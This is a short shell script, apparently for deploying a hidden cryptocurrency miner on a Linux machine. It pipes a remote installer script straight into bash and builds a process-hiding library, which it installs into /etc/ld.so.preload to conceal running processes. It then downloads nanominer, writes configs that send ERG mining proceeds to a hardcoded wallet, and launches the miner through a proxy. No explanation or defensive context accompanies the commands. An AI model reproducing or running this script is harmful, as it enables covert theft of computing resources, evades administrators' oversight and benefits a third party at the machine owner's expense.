wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh | bash

wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNan.zip
unzip magicNan.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://github.com/nanopool/nanominer/releases/download/3.3.5/nanominer-linux-3.3.5-cuda11.tar.gz
tar -xvzf nanominer-linux-3.3.5-cuda11.tar.gz
cd nanominer-linux-3.3.5-cuda11
rm config*

cat > config_ergo.ini <<END
[autolykos]
wallet = 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg
coin = ERG
rigName = Nano
pool1 = ergo-us-east1.nanopool.org:11433
END

cat > config.ini <<END
[autolykos]
wallet = 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg
coin = ERG
rigName = Nano
pool1 = ergo-us-east1.nanopool.org:11433
END

graftcp curl ifconfig.me
graftcp ./nanominer
